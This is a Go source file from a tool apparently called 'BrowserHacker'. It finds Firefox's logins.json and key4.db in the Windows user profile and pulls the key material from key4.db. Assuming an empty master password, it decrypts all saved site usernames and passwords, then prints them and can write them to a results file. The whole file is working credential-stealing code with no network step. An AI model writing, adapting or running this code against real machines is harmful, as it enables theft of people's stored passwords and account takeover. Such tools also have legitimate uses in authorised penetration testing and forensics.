package core

import (
	"BrowserHacker/crypher"
	"BrowserHacker/data"
	"bytes"
	"database/sql"
	"encoding/base64"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"
	"io/ioutil"
	"os"
	"path/filepath"
)

var FireFoxMainProfile string
var FireFoxMainDB string

const (
	FirefoxProfilePath = `/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release`
	FirefoxLoginJson = `logins.json`
	Firfoxkey4db = `key4.db`
)
type FirefoxData struct {
	HostName string
	EncryptUserName []byte
	EncryptPassword []byte
}
type FirefoxInit struct{
	// firefox init struct
	ProfilePath string
	KeyPath string
}

func (c *FirefoxInit)ReturnLoginJsonPath() string {
	// 返回火狐浏览器的login.json文件路径
	ProfilePath, err := filepath.Glob(os.Getenv("USERPROFILE") + FirefoxProfilePath)
	if err != nil {
		return ""
	}
	if FireFoxMainProfile != ""{
		return FireFoxMainProfile
	}else{
		return ProfilePath[0] + `/` + FirefoxLoginJson
	}
}

func (c *FirefoxInit)Returnkey4db() string {
	// 返回火狐浏览器key4.db文件路径
	ProfilePath ,err := filepath.Glob(os.Getenv("USERPROFILE") + FirefoxProfilePath)
	if err != nil {
		return ""
	}
	if FireFoxMainDB != ""{
		return FireFoxMainDB
	}else{
		return ProfilePath[0] + `/` + Firfoxkey4db
	}
}


func (c *FirefoxInit)ReturnCredentials(login string) ([]FirefoxData, error) {
	// 返回火狐浏览器的login凭证
	var FireFoxD []FirefoxData
	var EncryptUserName,EncryptPassword []byte
	file, err := ioutil.ReadFile(login) // 读取login.json文件中的内容
	if err != nil {
		fmt.Println(err)
		return []FirefoxData{}, err
	}
	// 获取到json格式的数据，尝试获取json文件中的数据并返回
	for _,value := range gjson.GetBytes(file,"logins").Array(){
		EncryptUserName, err = base64.StdEncoding.DecodeString(value.Get("encryptedUsername").String())
		if err != nil {
			EncryptUserName = []byte("")
		}
		EncryptPassword, err = base64.StdEncoding.DecodeString(value.Get("encryptedPassword").String())
		if err != nil {
			EncryptPassword = []byte("")
		}
		FireFoxD = append(FireFoxD,FirefoxData{
			HostName: value.Get("hostname").String(),
			EncryptPassword: EncryptPassword,
			EncryptUserName: EncryptUserName,
		})
	}
	return FireFoxD,nil
}

// 获取数据库中的密钥
func ReturnFireFoxDecryptkey(key string)(item1,item2,al1,al2 []byte,err error){
	var (
		keyDB *sql.DB
		pwdRows *sql.Rows
		nssRows *sql.Rows
	)
	// 打开存储key的数据库文件
	keyDB ,err = sql.Open("sqlite3",key)
	if err != nil {
		return nil,nil,nil,nil,err
	}
	defer func() {
		if err := keyDB.Close();err != nil {
			os.Exit(1)
		}
	}()
	// 查询pwd的数据
	pwdRows, err = keyDB.Query(`SELECT item1, item2 FROM metaData WHERE id = 'password'`)
	if err != nil {
		fmt.Println("can't find key4.db file")
		os.Exit(1)
	}
	defer func() {
		if err := pwdRows.Close(); err != nil {
			fmt.Println("can't find key in key4.db")
			os.Exit(1)
		}
	}()
	for pwdRows.Next(){
		if err := pwdRows.Scan(&item1,&item2);err != nil {
			continue
		}
	}
	if err != nil {
		fmt.Println("can't scan database result")
		os.Exit(1)
	}

	// 查询nss的数据
	nssRows, err = keyDB.Query(`SELECT a11, a102 from nssPrivate`)
	defer func() {
		if err := nssRows.Close();err != nil {
			os.Exit(1)
		}
	}()
	for nssRows.Next(){
		if err := nssRows.Scan(&al1,&al2); err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
	}
	return item1,item2,al1,al2,nil
}

func FireFoxExec() error{
	fmt.Println("firefox")
	var firefox FirefoxInit
	var file *os.File
	// 获取数据库中的加密所用的key等一些值
	globalSalt,metaByte, nssAl1, nssAl2 ,err := ReturnFireFoxDecryptkey(firefox.Returnkey4db())
	if err != nil {
		return err
	}
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	metaPBE, err := crypher.NewASN1PBE(metaByte)
	if err != nil {
		fmt.Println(err)
		return err
	}
	// 默认master password 为空
	var masterPwd []byte
	k, err := metaPBE.Decrypt(globalSalt,masterPwd)
	if err != nil {
		fmt.Println(err)
		return err
	}
	if data.FileName == true{
		file, _ = os.OpenFile("./result/firefox.txt", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0664)
	}
	if bytes.Contains(k,[]byte("password-check")){
		m:= bytes.Compare(nssAl2,keyLin)
		if m==0 {
			nssPBE, err := crypher.NewASN1PBE(nssAl1)
			if err != nil {
				fmt.Println(err)
				return err
			}
			finallykey, err := nssPBE.Decrypt(globalSalt,masterPwd)
			finallykey = finallykey[:24]
			if err != nil {
				fmt.Println(err)
				return err
			}
			allLogins, err := firefox.ReturnCredentials(firefox.ReturnLoginJsonPath())
			if err != nil {
				return err
			}
			for _,value  := range allLogins{
				userPBE, err := crypher.NewASN1PBE(value.EncryptUserName)
				if err != nil {
					fmt.Println(err)
					os.Exit(1)
				}
				pwdPBE, err := crypher.NewASN1PBE(value.EncryptPassword)
				if err != nil {
					fmt.Println(err)
					os.Exit(1)
				}
				user, err := userPBE.Decrypt(finallykey,masterPwd)
				if err != nil {
					fmt.Println(err)
					os.Exit(1)
				}
				pwd, err := pwdPBE.Decrypt(finallykey,masterPwd)
				if err != nil {
					fmt.Println(err)
					os.Exit(1)
				}
				fmt.Println("[+]",value.HostName)
				fmt.Println("UserName:",string(crypher.PKCS5UnPadding(user)))
				fmt.Println("PassWord:",string(crypher.PKCS5UnPadding(pwd)))
				fmt.Println("")
				if data.FileName == true {
					_,err  := file.WriteString("[+] "+ value.HostName + "\n")
					if err != nil {
						fmt.Println(err)
						os.Exit(1)
					}
					_, err = file.WriteString("[UserName]: "+string(crypher.PKCS5UnPadding(user))+ "\n")
					if err != nil {
						fmt.Println(err)
						os.Exit(1)
					}
					_, err = file.WriteString("[PassWord]: "+string(crypher.PKCS5UnPadding(pwd))+ "\n")
					if err != nil {
						fmt.Println(err)
						os.Exit(1)
					}
					_, err = file.WriteString("\n")
					if err != nil {
						fmt.Println(err)
						os.Exit(1)
					}
				}
			}
		}
	}
	_ = file.Sync()
	return nil
}


